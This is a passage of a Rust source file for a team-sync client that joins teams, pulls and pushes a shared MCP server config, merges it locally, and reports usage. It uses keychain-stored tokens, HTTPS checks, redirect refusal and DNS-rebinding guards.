//! Toolport Teams client: join a team, pull/push the shared MCP server set, and merge
//! it into the local registry non-destructively.
//!
//! The Teams server (the paid, source-available `conduit-teams` layer) holds only the
//! team's server SET and non-secret config, never a key. So joining a team makes the
//! team's servers appear locally, but each member still vaults every server's secrets
//! into their own OS keychain. "No keys in the cloud" stays true even for Teams.
//!
//! The HTTP calls (join/pull/push) are thin; the value and the risk live in the merge,
//! which is pure and unit-tested below.

use std::collections::{BTreeMap, HashMap, HashSet};

use serde_json::{json, Value};

use crate::registry::{EnvVar, Registry, ServerEntry, TeamConnection};
use crate::usage_report;

/// Reserved keychain slot for the member bearer token (one team connection at a time).
pub const TEAM_TOKEN_SERVER: &str = "__conduit_team__";
pub const TEAM_TOKEN_KEY: &str = "member_token";
pub const HOSTED_TEAMS_URL: &str = "https://teams.toolport.app";

pub fn save_token(token: &str) -> Result<(), String> {
    crate::secrets::set_secret(TEAM_TOKEN_SERVER, TEAM_TOKEN_KEY, token)
}
/// Distinguishes "no token stored" (`Ok(None)`) from a failed vault read
/// (`Err`) so a locked keychain reads as an error, not as signed-out (SBS-789).
pub fn load_token() -> Result<Option<String>, String> {
    crate::secrets::get_secret_result(TEAM_TOKEN_SERVER, TEAM_TOKEN_KEY)
}
pub fn clear_token() -> Result<(), String> {
    crate::secrets::delete_secret(TEAM_TOKEN_SERVER, TEAM_TOKEN_KEY)
}

fn base(server_url: &str) -> String {
    server_url.trim_end_matches('/').to_string()
}

/// Team bearer tokens must not ride over cleartext except to a local dev server.
fn require_secure_team_url(server_url: &str) -> Result<(), String> {
    let lower = server_url.trim().to_ascii_lowercase();
    if lower.starts_with("https://") {
        return Ok(());
    }
    if !lower.starts_with("http://") {
        return Err("team server URL must start with https://".to_string());
    }

    let host = crate::oauth::host_of_url(server_url).unwrap_or_default();
    let loopback = host.eq_ignore_ascii_case("localhost")
        || host.to_ascii_lowercase().ends_with(".localhost")
        || host
            .parse::<std::net::IpAddr>()
            .ok()
            .map_or(false, |ip| match ip {
                std::net::IpAddr::V4(v4) => v4.is_loopback(),
                std::net::IpAddr::V6(v6) => {
                    v6.is_loopback()
                        || v6
                            .to_ipv4_mapped()
                            .map(|v4| v4.is_loopback())
                            .unwrap_or(false)
                }
            });
    if loopback {
        Ok(())
    } else {
        Err(
            "team server URL must use https:// unless it is loopback HTTP for local development"
                .to_string(),
        )
    }
}

/// Public team hosts must not rebind onto the LAN; loopback/LAN team URLs (local
/// `conduit-teams`) still connect. Link-local / cloud-metadata is always refused
/// inside [`crate::oauth::screened_resolve`].
///
/// Switching the rebind guard OFF is granting LAN trust, so it needs
/// [`crate::oauth::host_is_definitely_private`], not the negation of
/// [`crate::oauth::host_is_private`]. That is the issue #422 inversion `oauth.rs`
/// documents: `host_is_private` fails CLOSED, returning true for an empty,
/// unresolvable, or mixed-answer host, which is correct for refusing and backwards
/// for granting. Negated, an attacker serving NXDOMAIN for their own name - or a
/// public name whose first lookup merely fails - turned the guard off and let the
/// connection land on RFC1918.
fn block_private_for_team_url(server_url: &str) -> bool {
    block_private_for_team_url_with(server_url, &crate::oauth::resolve_host)
}

/// [`block_private_for_team_url`] with the resolver passed in, so the NXDOMAIN case
/// can be tested without asking whichever DNS the developer is behind (SBS-827).
fn block_private_for_team_url_with(server_url: &str, resolve: crate::oauth::HostResolver) -> bool {
    let host = crate::oauth::host_of_url(server_url).unwrap_or_default();
    !crate::oauth::host_is_definitely_private_with(&host, resolve)
}

/// A ureq agent with a connect + read timeout. The team commands run on the Tauri
/// command thread, so a slow or black-holed team server must not hang the UI: bare
/// `ureq::get/post/put` have no timeout, this does.
///
/// Redirects are refused: a 302 would replay `Authorization: Bearer` to a host of
/// the redirector's choosing (the same control OAuth token POSTs and MCP HTTP use).
fn agent(server_url: &str) -> ureq::Agent {
    agent_with_timeout(server_url, 30)
}

/// A ureq agent with an explicit total timeout. A long-poll config pull needs a client
/// timeout comfortably above the server's `wait` window, so the server (not the client)
/// decides when to return.
fn agent_with_timeout(server_url: &str, secs: u64) -> ureq::Agent {
    let block_private = block_private_for_team_url(server_url);
    ureq::AgentBuilder::new()
        .timeout(std::time::Duration::from_secs(secs))
        .redirects(0)
        .resolver(move |netloc: &str| crate::oauth::screened_resolve(netloc, block_private))
        .build()
}

/// `300 Multiple Choices` is a redirect too, and excluding it made it read as
/// SUCCESS: `post_usage_day` returned `Ok(true)` without the server having recorded
/// anything, so the caller persisted a receipt and suppressed the retry, and
/// `post_call_events` advanced its cursor past events that were never sent. Silent
/// data loss, not just a missed hop.
/// 305/306 are deprecated but still 3xx-with-Location; 304 stays out because it
/// carries no Location and means "unchanged", not "go elsewhere".
fn is_redirect_status(status: u16) -> bool {
    matches!(status, 300 | 301 | 302 | 303 | 305 | 306 | 307 | 308)
}

/// ureq with `redirects(0)` returns 3xx as a successful response. Treat those as
/// errors so a team API never follows (or silently accepts) a bearer-bearing hop.
fn require_no_redirect(resp: ureq::Response) -> Result<ureq::Response, String> {
    if is_redirect_status(resp.status()) {
        Err("team server redirected; Toolport does not follow redirects on team API calls".into())
    } else {
        Ok(resp)
    }
}

// --- HTTP client (ureq) ---

#[derive(Debug)]
pub struct Joined {
    pub team_id: String,
    pub member_token: String,
    pub role: String,
}

/// Outcome of redeeming a code at `/join`.
pub enum JoinResult {
    /// Joined immediately: the token/role are ready to finalize.
    Joined(Joined),
    /// The link requires admin approval. No member/token exists yet; poll `request_token` via
    /// [`poll_join`] until an admin approves or denies.
    Pending { request_token: String },
}

/// Parse a `Joined` from a `/join` (or `/join/status`) response body. Both endpoints return the
/// same `team_id` / `member_token` / `role` shape on success.
fn joined_from(v: &Value) -> Result<Joined, String> {
    let token = v["member_token"].as_str().unwrap_or_default().to_string();
    if token.is_empty() {
        return Err("server did not return a member token".into());
    }
    Ok(Joined {
        team_id: v["team_id"].as_str().unwrap_or_default().to_string(),
        member_token: token,
        role: v["role"].as_str().unwrap_or("member").to_string(),
    })
}

/// Redeem an invite or join-link code. A normal code joins immediately; an approval-gated link
/// returns `Pending` with a token to poll.
pub fn join(
    server_url: &str,
    invite_code: &str,
    member_name: Option<&str>,
) -> Result<JoinResult, String> {
    require_secure_team_url(server_url)?;
    let url = format!("{}/join", base(server_url));
    let body = serde_json::json!({ "invite_code": invite_code, "member_name": member_name });
    let resp = require_no_redirect(
        agent(server_url)
            .post(&url)
            .send_json(body)
            .map_err(stringify)?,
    )?;
    let v: Value = resp.into_json().map_err(|e| e.to_string())?;
    // An approval-gated link hands back a request token instead of a member token.
    if v["pending"].as_bool().unwrap_or(false) {
        let request_token = v["request_token"].as_str().unwrap_or_default().to_string();
        if request_token.is_empty() {
            return Err("the server marked the join pending but returned no request token".into());
        }
        return Ok(JoinResult::Pending { request_token });
    }
    Ok(JoinResult::Joined(joined_from(&v)?))
}

/// Result of polling a pending join request at `/join/status`.
pub enum JoinPoll {
    /// Still waiting on an admin.
    Pending,
    /// Approved and fully finalized locally (token vaulted, config pulled + merged).
    Connected(MergeOutcome),
    /// An admin denied the request.
    Denied,
    /// The request is gone (expired or the token is wrong); the user should start over.
    Unknown,
}

/// Poll a pending join request. On approval, finalizes the join exactly like a direct connect
/// (vaults the fresh token, pulls + merges the team config) and returns `Connected`.
pub fn poll_join(
    server_url: &str,
    request_token: &str,
    member_name: Option<&str>,
) -> Result<JoinPoll, String> {
    require_secure_team_url(server_url)?;
    let url = format!("{}/join/status", base(server_url));
    let body = serde_json::json!({ "request_token": request_token });
    let resp = require_no_redirect(
        agent(server_url)
            .post(&url)
            .send_json(body)
            .map_err(stringify)?,
    )?;
    let v: Value = resp.into_json().map_err(|e| e.to_string())?;
    match v["status"].as_str().unwrap_or("") {
        "approved" => {
            complete_join(server_url, member_name, joined_from(&v)?).map(JoinPoll::Connected)
        }
        "denied" => Ok(JoinPoll::Denied),
        "pending" => Ok(JoinPoll::Pending),
        _ => Ok(JoinPoll::Unknown),
    }
}

/// Pull the team's current config. `Ok(None)` means unchanged since `last_version`
/// (HTTP 304); `Ok(Some((version, config)))` is the new config.
pub fn pull_config(
    server_url: &str,
    team_id: &str,
    token: &str,
    last_version: i64,
    last_etag: Option<&str>,
    wait_secs: u64,
) -> Result<Option<(i64, Value, Option<String>)>, String> {
    require_secure_team_url(server_url)?;
    let mut url = format!("{}/teams/{}/config", base(server_url), team_id);
    // Long-poll: ask the server to hold the request until the team config view changes (or
    // `wait_secs` elapses), so a dashboard policy edit reaches us in ~1s instead of at the
    // next cycle. Give the client a timeout above the server's window so the server decides
    // when to return; a 304/200 the moment something changes.
    let ag = if wait_secs > 0 {
        url.push_str(&format!("?wait={wait_secs}"));
        agent_with_timeout(server_url, wait_secs + 10)
    } else {
        agent(server_url)
    };
    // Echo the exact ETag the server last gave us. A restricted member's ETag carries a
    // per-member access suffix ("v{n}-m{hash}"), so a reconstructed "v{n}" would never
    // 304 for them; fall back to "v{n}" only before we've ever stored one.
    let etag = last_etag
        .map(str::to_string)
        .unwrap_or_else(|| format!("\"v{last_version}\""));
    let req = ag
        .get(&url)
        .set("authorization", &format!("Bearer {token}"))
        .set("if-none-match", &etag);
    match req.call() {
        Ok(resp) => {
            if resp.status() == 304 {
                return Ok(None);
            }
            let resp = require_no_redirect(resp)?;
            // Capture the fresh ETag before the body consumes `resp`.
            let new_etag = resp.header("etag").map(str::to_string);
            let v: Value = resp.into_json().map_err(|e| e.to_string())?;
            // Guard a malformed-but-200 body: without a real server list we must NOT
            // proceed, since apply_team_config would read the missing list as "the team
            // removed every server" and wipe the user's merged team servers. An empty
            // `servers: []` is legitimate (team genuinely has none); a missing/non-array
            // `servers` is not.
            let config = v.get("config").cloned().unwrap_or(Value::Null);
            if !config.get("servers").map(Value::is_array).unwrap_or(false) {
                return Err("team server returned a config without a server list".into());
            }
            let version = v["version"]
                .as_i64()
                .ok_or("team server returned a config without a version")?;
            Ok(Some((version, config, new_etag)))
        }
        Err(ureq::Error::Status(304, _)) => Ok(None),
        // A team that has never had a config pushed yet returns 404 (no config row on the
        // server). That is "nothing to sync," not a failure: without this, the first
        // pull_config in `connect` errors out and rolls the just-saved member token back, so
        // joining any brand-new team fails outright. The current server serves an empty
        // `{servers:[]}` 200 for this case; this keeps a new client working against an older
        // self-hosted server that still 404s. Mirrors `fetch_me`/`post_usage_day` below,
        // which likewise treat a 404 as "resource/endpoint absent, degrade gracefully."
        Err(ureq::Error::Status(404, _)) => Ok(None),
        Err(e) => Err(stringify(e)),
    }
}

/// Result of the `/me` membership heartbeat.
pub enum MembershipCheck {
    /// Still a member; carries the current (possibly changed) role.
    Active { role: String },
    /// The server explicitly rejected the token (401/403): the member was removed or
    /// their token revoked. Distinct from a transport error so a mere network blip
    /// never tears down the local team.
    Removed,
    /// The server has no `/me` route (an older self-host build). Fall back to the plain
    /// config-pull behavior so a new client still works against an old server.
    Unsupported,
}

/// Ask the team server who the caller is now. Returns `Removed` only on an explicit
/// 401/403 (the authoritative "you're no longer a member" signal); any transport
/// error is surfaced as `Err` so a flaky network doesn't masquerade as removal.
pub fn fetch_me(server_url: &str, team_id: &str, token: &str) -> Result<MembershipCheck, String> {
    require_secure_team_url(server_url)?;
    let url = format!("{}/teams/{}/me", base(server_url), team_id);
    match agent(server_url)
        .get(&url)
        .set("authorization", &format!("Bearer {token}"))
        .call()
    {
        Ok(resp) => {
            let resp = require_no_redirect(resp)?;
            let v: Value = resp.into_json().map_err(|e| e.to_string())?;
            // Fail noisily on a malformed 200 rather than defaulting to "member": a
            // silent default would demote an admin's persisted role on a buggy response.
            let role = v["role"]
                .as_str()
                .ok_or("membership response had no role")?
                .to_string();
            Ok(MembershipCheck::Active { role })
        }
        Err(ureq::Error::Status(401 | 403, _)) => Ok(MembershipCheck::Removed),
        Err(ureq::Error::Status(404, _)) => Ok(MembershipCheck::Unsupported),
        Err(e) => Err(stringify(e)),
    }
}

/// A dashboard edit that lands between the preflight GET and PUT must never be overwritten.
/// Keep this message stable and actionable: it is surfaced directly in the Teams UI.
const STALE_PUSH_MESSAGE: &str =
    "The team config changed before this update could be saved. Sync to review the latest settings, then try again; nothing was overwritten.";

/// Fetch the complete current config before an admin replaces its server list. Unlike the
/// sync pull, this request is intentionally unconditional: the caller needs the full object so
/// instructions, policies, and future top-level fields can be round-tripped unchanged.
fn fetch_config_for_update(
    server_url: &str,
    team_id: &str,
    token: &str,
) -> Result<(i64, Value), String> {
    require_secure_team_url(server_url)?;
    let url = format!("{}/teams/{}/config", base(server_url), team_id);
    match agent(server_url)
        .get(&url)
        .set("authorization", &format!("Bearer {token}"))
        .call()
    {
        Ok(resp) => {
            let resp = require_no_redirect(resp)?;
            let v: Value = resp.into_json().map_err(|e| e.to_string())?;
            let version = v["version"]
                .as_i64()
                .ok_or("team server returned a config without a version")?;
            let config = v.get("config").cloned().unwrap_or(Value::Null);
            if !config.is_object() || !config.get("servers").map(Value::is_array).unwrap_or(false) {
                return Err("team server returned a config without a server list".into());
            }
            Ok((version, config))
        }
        // Older self-hosted servers can have no config row until the first push. Version zero
        // is the optimistic-concurrency baseline used by current servers for that empty state.
        Err(ureq::Error::Status(404, _)) => Ok((0, json!({ "servers": [] }))),
        Err(e) => Err(stringify(e)),
    }
}

/// Replace only `servers` in a fetched config, preserving every other current and future field.
fn replace_server_set(mut config: Value, servers: Value) -> Result<Value, String> {
    if !servers.is_array() {
        return Err("local team export did not contain a server list".into());
    }
    let object = config
        .as_object_mut()
        .ok_or("team server returned a config that was not an object")?;
    object.insert("servers".to_string(), servers);
    Ok(config)
}

fn push_body(config: &Value, base_version: i64) -> Value {
    json!({ "config": config, "base_version": base_version })
}

fn push_status_message(status: u16) -> Option<&'static str> {
    (status == 409).then_some(STALE_PUSH_MESSAGE)
}

#[derive(Debug, Clone, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub struct PushPreview {
    pub base_version: i64,
    pub local_fingerprint: String,
    pub added: Vec<String>,
    pub changed: Vec<String>,
    pub removed: Vec<String>,
}

fn server_index(servers: &Value) -> Result<BTreeMap<String, &Value>, String> {
    let list = servers
        .as_array()
        .ok_or("team server list was not an array")?;
    let mut indexed = BTreeMap::new();
    for server in list {
        let id = server
            .get("id")
            .and_then(Value::as_str)
            .filter(|id| !id.trim().is_empty())
            .ok_or("team server entry had no id")?
            .to_string();
        if indexed.insert(id.clone(), server).is_some() {
            return Err(format!("team server list contained duplicate id '{id}'"));
        }
    }
    Ok(indexed)
}

fn preview_name(server: &Value, id: &str) -> String {
    server
        .get("name")
        .and_then(Value::as_str)
        .filter(|name| !name.trim().is_empty())
        .unwrap_or(id)
        .to_string()
}

fn sort_preview_names(names: &mut [String]) {
    names.sort_by(|a, b| {
        a.to_ascii_lowercase()
            .cmp(&b.to_ascii_lowercase())
            .then_with(|| a.cmp(b))
    });
}

fn build_push_preview(
    base_version: i64,
    remote_servers: &Value,
    local_servers: &Value,
) -> Result<PushPreview, String> {
    let remote = server_index(remote_servers)?;
    let local = server_index(local_servers)?;
    let mut added = Vec::new();
    let mut changed = Vec::new();
    let mut removed = Vec::new();

    for (id, server) in &local {
        match remote.get(id) {
            None => added.push(preview_name(server, id)),
            Some(previous) if *previous != *server => changed.push(preview_name(server, id)),
            Some(_) => {}
        }
    }
    for (id, server) in &remote {
        if !local.contains_key(id) {
            removed.push(preview_name(server, id));
        }
    }
    sort_preview_names(&mut added);
    sort_preview_names(&mut changed);
    sort_preview_names(&mut removed);

    Ok(PushPreview {
        base_version,
        local_fingerprint: crate::audit::args_hash(local_servers),
        added,
        changed,
        removed,
    })
}

/// Admin push of a servers-only config update. Returns the new version.
pub fn push_config(
    server_url: &str,
    team_id: &str,
    token: &str,
    config: &Value,
    base_version: i64,
) -> Result<i64, String> {
    require_secure_team_url(server_url)?;
    let url = format!("{}/teams/{}/config", base(server_url), team_id);
    let body = push_body(config, base_version);
    let resp = match agent(server_url)
        .put(&url)
        .set("authorization", &format!("Bearer {token}"))
        .send_json(body)
    {
        Ok(resp) => require_no_redirect(resp)?,
        Err(e @ ureq::Error::Status(status, _)) => {
            if let Some(message) = push_status_message(status) {
                return Err(message.into());
            }
            return Err(stringify(e));
        }
        Err(e) => return Err(stringify(e)),
    };
    let v: Value = resp.into_json().map_err(|e| e.to_string())?;
    v["version"]
        .as_i64()
        .ok_or_else(|| "team server did not return a version after push".to_string())
}

/// Report one UTC day's usage rollup (counts + estimates only, see `usage_report`).
/// `Ok(true)` means the server recorded it; `Ok(false)` means the server predates the
/// usage endpoint (404), mirroring `MembershipCheck::Unsupported` so a new client
/// still works against an old self-hosted server.
fn post_usage_day(
    server_url: &str,
    team_id: &str,
    token: &str,
    day: &str,
    rows: Vec<Value>,
    instructions_status: Option<&Value>,
    policy_status: Option<&Value>,
) -> Result<bool, String> {
    require_secure_team_url(server_url)?;
    let url = format!("{}/teams/{}/usage", base(server_url), team_id);
    let mut body = json!({ "day": day, "rows": rows });
    // The apply-status receipt rides the usage POST (spec W5). An older server ignores the extra
    // key; a client without instructions omits it entirely.
    if let Some(status) = instructions_status {
        body["instructionsStatus"] = status.clone();
    }
    // Screening-policy apply receipt (SOU-339): as-enforced values of the four safety flags.
    // Same ride-on-usage / ignore-if-unknown pattern as instructions.
    if let Some(status) = policy_status {
        body["policyStatus"] = status.clone();
    }
    match agent(server_url)
        .post(&url)
        .set("authorization", &format!("Bearer {token}"))
        .send_json(body)
    {
        Ok(resp) => {
            require_no_redirect(resp)?;
            Ok(true)
        }
        Err(ureq::Error::Status(404 | 405, _)) => Ok(false),
        Err(e) => Err(stringify(e)),
    }
}

fn stringify(e: ureq::Error) -> String {
    match e {
        ureq::Error::Status(code, resp) => {
            let msg = resp.into_string().unwrap_or_default();
            format!("server returned {code}: {}", msg.trim())
        }
        ureq::Error::Transport(t) => format!("could not reach the team server: {t}"),
    }
}

// --- orchestration (HTTP + merge + persist) ---

/// Outcome of a connect attempt: either fully joined, or held pending admin approval.
pub enum ConnectOutcome {
    /// Joined and merged; carries the config-merge result for the review prompt.
    Connected(MergeOutcome),
    /// The link requires approval. Nothing was stored locally (no token, no connection); the
    /// caller polls `request_token` via [`poll_join`] until an admin acts.
    Pending { request_token: String },
}

/// Join a team: redeem the code, and for a normal join vault the token, record the connection,
/// and do the first pull + merge. An approval-gated link returns `Pending` and stores nothing.
pub fn connect(
    server_url: &str,
    invite_code: &str,
    member_name: Option<&str>,
) -> Result<ConnectOutcome, String> {
    match join(server_url, invite_code, member_name)? {
        JoinResult::Joined(joined) => {
            complete_join(server_url, member_name, joined).map(ConnectOutcome::Connected)
        }
        JoinResult::Pending { request_token } => Ok(ConnectOutcome::Pending { request_token }),
    }
}

/// Finalize an approved join: vault the token, record the connection, and do the first
/// pull + merge. Shared by the direct-connect and approval-poll paths.
fn complete_join(
    server_url: &str,
    member_name: Option<&str>,
    joined: Joined,
) -> Result<MergeOutcome, String> {
    save_token(&joined.member_token)?;
    // The token is now in the keychain. Any failure past this point must clear it,
    // or we'd orphan a live bearer token with no local record of the connection.
    finish_connect(server_url, member_name, joined)
        .map(|(_conn, outcome)| outcome)
        .inspect_err(|_| {
            let _ = clear_token();
        })
}

fn finish_connect(
    server_url: &str,
    member_name: Option<&str>,
    joined: Joined,
) -> Result<(TeamConnection, MergeOutcome), String> {
    let conn = TeamConnection {
        server_url: base(server_url),
        team_id: joined.team_id.clone(),
        role: joined.role.clone(),
        member_name: member_name.map(String::from),
        last_version: 0,
        last_etag: None,
        usage_reported: HashMap::new(),
        team_instructions_content: None,
        team_instructions_version: 0,
        team_instructions_targets: Vec::new(),
        team_instructions_reported: None,
        team_instructions_reported_at: None,
        team_policy_reported: None,
        team_policy_reported_at: None,
        call_audit_export_cursor: None,
        call_audit_export: false,
        rate_limits: Vec::new(),
    };
    // Pull BEFORE loading the registry, then load a FRESH copy AFTER the (possibly
    // multi-second) network round trip and apply onto that — mirroring `sync_inner`.
    // Loading first and saving here would clobber any change another command made to the
    // registry while we were waiting on the join window's pull.
    let pulled = pull_config(
        &base(server_url),
        &joined.team_id,
        &joined.member_token,
        0,
        None,
        0,
    )?;
    // Capture the org instructions before the closure consumes `pulled`; applied to disk after
    // the save (outside the lock).
    let desired_instr = pulled
        .as_ref()
        .map(|(version, cfg, _)| (*version, desired_instructions(cfg)));
    // Load-modify-save the fresh registry under the cross-process lock, so a concurrent write
    // during the join window's pull isn't reverted (SOU-23).
    let (reg, outcome) = crate::registry::update(|reg| {
        reg.team = Some(conn);
        let mut outcome = MergeOutcome::default();
        if let Some((version, cfg, etag)) = pulled {
            outcome = apply_team_config(reg, &joined.team_id, &cfg);
            if let Some(t) = reg.team.as_mut() {
                t.last_version = version;
                t.last_etag = etag;
            }
        }
        Ok(outcome)
    })?;
    if let Some((version, desired)) = desired_instr {
        apply_instructions(&joined.team_id, version, desired.as_deref());
    }
    let conn = reg
        .team
        .clone()
        .ok_or_else(|| "team connection lost after save".to_string())?;
    Ok((conn, outcome))
}

/// Pull the latest team config and merge it. `Ok(None)` if nothing changed.
/// The result of a sync.
pub enum SyncResult {
    /// The member was removed from the team; the local team servers, connection, and
    /// token have already been cleared (via `disconnect`).
    Removed,
    /// Still a member. `role` is the current role (refreshed even on a config 304),
    /// `role_changed` flags a promotion/demotion, and `applied` is `Some` only when the
    /// shared config actually changed this sync.
    Ok {
        role: String,
        role_changed: bool,
        applied: Option<(i64, MergeOutcome)>,
    },
}

pub fn sync_now() -> Result<SyncResult, String> {
    sync_inner(0)
}

/// Long-polling variant of [`sync_now`]: the config pull parks on the server for up to
/// `wait_secs`, returning the instant the team's config view changes so a dashboard policy
/// edit enforces in about a second. The membership heartbeat still runs first each cycle,
/// so removal and role changes are caught at least once per cycle. The caller loops.
pub fn sync_wait(wait_secs: u64) -> Result<SyncResult, String> {
    sync_inner(wait_secs)
}

fn sync_inner(wait_secs: u64) -> Result<SyncResult, String> {
    // Snapshot only what the network calls need; do NOT hold this copy to save later.
    let conn = {
        let reg = crate::registry::load()?;
        reg.team.clone().ok_or("not connected to a team")?
    };
    let token = load_token()?.ok_or("team token is missing from the keychain")?;

    // Membership heartbeat first. This catches two things a config pull can't: removal
    // (a config pull would just error on the now-invalid token, indistinguishable from a
    // network failure) and a role change (a role change doesn't bump the config version,
    // so the pull returns 304 and the client would keep showing stale admin controls).
    let role = match fetch_me(&conn.server_url, &conn.team_id, &token)? {
        MembershipCheck::Removed => {
            // Authoritatively removed: tear down the local team so we stop running its
            // servers and stop showing it. `disconnect` reloads + saves the registry.
            disconnect()?;
            return Ok(SyncResult::Removed);
        }
        MembershipCheck::Active { role } => role,
        // Old server without /me: keep the last-known role and fall through to the pull.
        MembershipCheck::Unsupported => conn.role.clone(),
    };
    let role_changed = role != conn.role;

    let pulled = pull_config(
        &conn.server_url,
        &conn.team_id,
        &token,
        conn.last_version,
        conn.last_etag.as_deref(),
        wait_secs,
    )?;

    // Capture the org instructions before the closure consumes `pulled`; applied to disk after
    // the save (outside the lock). `None` on a 304 (config unchanged) — nothing to reconcile.
    let desired_instr = pulled
        .as_ref()
        .map(|(version, cfg, _)| (*version, desired_instructions(cfg)));
    // Re-load a FRESH registry now, AFTER the (possibly multi-second) network round
    // trips, and apply the deltas to it. Loading at the top and saving here would clobber
    // any change another command made to the registry while we were on the network.
    // Apply the deltas onto a FRESH registry under the cross-process lock, so a concurrent
    // app or gateway write between our network round trip and our save isn't reverted
    // (SOU-23). The closure returns `None` when the user disconnected / switched teams
    // mid-sync (nothing applied); `Some(applied)` otherwise.
    let (_, result) = crate::registry::update(|reg| {
        match reg.team.as_ref() {
            None => return Ok(None),
            Some(t) if t.team_id != conn.team_id => return Ok(None),
            _ => {}
        }
        let applied = match pulled {
            None => None,
            Some((version, cfg, etag)) => {
                let outcome = apply_team_config(reg, &conn.team_id, &cfg);
                if let Some(t) = reg.team.as_mut() {
                    t.last_version = version;
                    t.last_etag = etag;
                }
                Some((version, outcome))
            }
        };
        // Persist the refreshed role alongside any applied config, so admin-only UI tracks
        // the member's real, current role on every sync.
        if let Some(t) = reg.team.as_mut() {
            t.role = role.clone();
        }
        Ok(Some(applied))
    })?;
    let applied = match result {
        // Skipped (disconnected / switched teams mid-sync): don't report usage for it.
        None => {
            return Ok(SyncResult::Ok {
                role,
                role_changed,
                applied: None,
            })
        }
        Some(applied) => applied,
    };
    // Write/refresh the org instructions to each installed client's rules file (skips unless the
    // content actually changed, or a target moved). Outside the lock, best-effort, never fails
    // the sync.
    match desired_instr {
        Some((version, desired)) => apply_instructions(&conn.team_id, version, desired.as_deref()),
        // A 304 means the org text is unchanged, but a release can still move where a client
        // reads its rules from (Goose/Zed under XDG, SBS-899). Re-run against the content we
        // already applied so the block relocates on the next quiet cycle rather than waiting for
        // an admin edit; `apply_instructions` returns immediately unless a target really moved.
        None => relocate_stored_instructions(&conn.team_id),
    }
    // Best-effort showback after the config work: report today's/yesterday's per-server
    // usage rollup to the team server. Any failure here must never affect the sync
    // result — the member's config is already applied and saved.
    report_usage(&conn, &token);
    // Report each installed client's instructions coverage (spec W5), every cycle, deduped so an
    // unchanged receipt isn't re-sent. Independent of the config change above, so a client
    // installed after the last edit is reflected as soon as it appears.
    report_instructions_status(&conn, &token);
    // Report as-enforced screening-policy flags (SOU-339) so the org can prove cooperative
    // enforcement took effect on this machine. Deduped like the instructions receipt.
    report_policy_status(&conn, &token);
    // Opt-in per-call audit export (SOU-171): tool name/ts/duration/ok/argsHash only.
    report_call_events(&conn, &token);
    Ok(SyncResult::Ok {
        role,
        role_changed,
        applied,
    })
}

/// Merge a fresh local rollup with what was already reported for that day, taking the
/// max per counter. The local logs only grow within a day, so a SMALLER local number
/// means a log rotation trimmed history — and since the server's `record_usage`
/// upserts by replacement, re-sending the shrunken count would erase usage the server
/// already recorded. Max is always the authoritative daily total.
fn merge_reported(
    local: &BTreeMap<String, usage_report::Row>,
    reported: Option<&HashMap<String, [u64; 2]>>,
) -> HashMap<String, [u64; 2]> {
    let mut merged: HashMap<String, [u64; 2]> = reported.cloned().unwrap_or_default();
    for (server, row) in local {
        let e = merged.entry(server.clone()).or_insert([0, 0]);
        e[0] = e[0].max(row.calls);
        e[1] = e[1].max(row.tokens_saved);
    }
    merged
}

/// Best-effort usage showback: roll up today + yesterday (UTC) for THIS team's servers
/// only (`source = "team:<id>"` — a member's personal servers are never reported) and
/// POST the rollups. Counts and token/dollar estimates only; tool names stay local
/// (rows are per server). Skips silently when there is nothing new, the server is too
/// old for the endpoint, or the network is down — never fails the sync it rides on.
fn report_usage(conn: &TeamConnection, token: &str) {
    let tag = tag_for(&conn.team_id);
    let (team_servers, reported) = {
        let Ok(reg) = crate::registry::load() else {
            return;
        };
        // The user disconnected or switched teams mid-sync: report nothing.
        match reg.team.as_ref() {
            Some(t) if t.team_id == conn.team_id => {}
            _ => return,
        }
        let ids: HashSet<String> = reg
            .servers
            .iter()
            .filter(|s| s.source.as_deref() == Some(tag.as_str()))
            .map(|s| s.id.clone())
            .collect();
        let reported = reg
            .team
            .as_ref()
            .map(|t| t.usage_reported.clone())
            .unwrap_or_default();
        (ids, reported)
    };
    if team_servers.is_empty() {
        return;
    }
    // An unreadable audit log is not "zero usage". Skip this cycle rather than
    // POST a false empty report (SBS-873).
    let Ok(audit_lines) = crate::audit::read_recent(usize::MAX) else {
        return;
    };
    let savings_lines = crate::savings::entries();
    let mut new_state: HashMap<String, HashMap<String, [u64; 2]>> = HashMap::new();
    let mut changed = false;
    for back in 0..2u64 {
        let day = usage_report::utc_day_back(back);
        let local = usage_report::rollup(&day, &audit_lines, &savings_lines, &team_servers);
        let merged = merge_reported(&local, reported.get(&day));
        if merged.is_empty() {
            continue;
        }
        if reported.get(&day) == Some(&merged) {
            // Nothing new since the last successful report: keep the watermark, skip
            // the POST so an idle 5-minute background sync costs the server nothing.
            new_state.insert(day, merged);
            continue;
        }
        let rows: Vec<Value> = merged
            .iter()
            .map(|(server, [calls, saved])| {
                json!({
                    "server": server,
                    "calls": calls,
                    "tokens_saved": saved,
                    "est_cost": usage_report::est_cost(*saved),
                })
            })
            .collect();
        match post_usage_day(
            &conn.server_url,
            &conn.team_id,
            token,
            &day,
            rows,
            None,
            None,
        ) {
            Ok(true) => {
                new_state.insert(day, merged);
                changed = true;
            }
            // Old server without the endpoint: nothing to persist, don't retry the
            // other day either.
            Ok(false) => return,
            // Transient failure: keep the previous watermark for this day so the next
            // sync re-sends the full daily total.
            Err(_) => {
                if let Some(prev) = reported.get(&day) {
                    new_state.insert(day, prev.clone());
                }
            }
        }
    }
    if !changed {
        return;
    }
    // Persist the watermarks on a FRESH registry (same clobber-avoidance as sync_inner:
    // the POSTs above are network round trips another command may have raced past).
    // `new_state` only ever holds today + yesterday, so old days prune themselves.
    let _ = crate::registry::update(|reg| {
        if let Some(t) = reg.team.as_mut() {
            if t.team_id == conn.team_id {
                t.usage_reported = new_state;
            }
        }
        Ok(())
    });
}

/// The org instructions the pulled config wants applied: the `content` string when the block
/// is present, enabled, and non-empty; `None` (meaning "remove any managed files") when the key
/// is absent, disabled, or blank. A Free/lapsed team never receives the key (the server
/// soft-drops it), so those members degrade to clean removal here automatically.
fn desired_instructions(cfg: &serde_json::Value) -> Option<String> {
    let i = cfg.get("instructions")?;
    let enabled = i.get("enabled").and_then(|v| v.as_bool()).unwrap_or(true);
    let content = i.get("content").and_then(|v| v.as_str()).unwrap_or("");
    (enabled && !content.trim().is_empty()).then(|| content.to_string())
}

/// Every installed client's rules target, de-duped by path so a file two clients share (e.g.
/// Gemini/Antigravity) is only written once. Split out of [`apply_instructions`] so a test can
/// drive an apply over a known target set instead of over the developer's real machine.
fn installed_rules_targets() -> Vec<crate::instructions::Target> {
    let mut seen_paths = std::collections::HashSet::new();
    crate::clients::detect_clients()
        .into_iter()
